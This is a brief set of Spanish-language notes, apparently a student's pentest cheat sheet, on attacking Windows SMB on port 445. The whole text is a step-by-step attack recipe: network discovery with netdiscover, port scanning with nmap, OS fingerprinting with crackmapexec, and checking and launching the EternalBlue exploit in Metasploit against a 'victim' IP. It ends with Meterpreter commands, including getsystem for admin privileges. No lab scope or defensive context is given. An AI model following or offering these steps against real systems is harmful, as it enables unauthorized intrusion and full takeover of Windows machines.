# PORT: 445 
### 1. netdiscover
Comndo usado para ver los IP en la red

### 2. nmap -F/f/Sv IP victima
Comando usado para ver los puertos abiertos
* vamos a usar el 445
  
### 3. crackmapexec smb IP victima 
Comando usado para obtener el sitema operativo 

### 4. Metasploit
1. search eternal 
2. use 3 
   
   Es un axuliar que me ayuda a descubir si el sistema es vulnerable al exploit a utilizar
   * set RHOST IP victima
   * options
3. run 
   
   Me va a decir si es vulnerable o no
4. back
5. search eternal 
6. use 0

   Es el exploit a utilizar
7. set RHOST IP victima
8. exploit

### 9. METERPRETER
* sysinfo
* getuid
* ?
* getsystem(me da privilegios de admi)
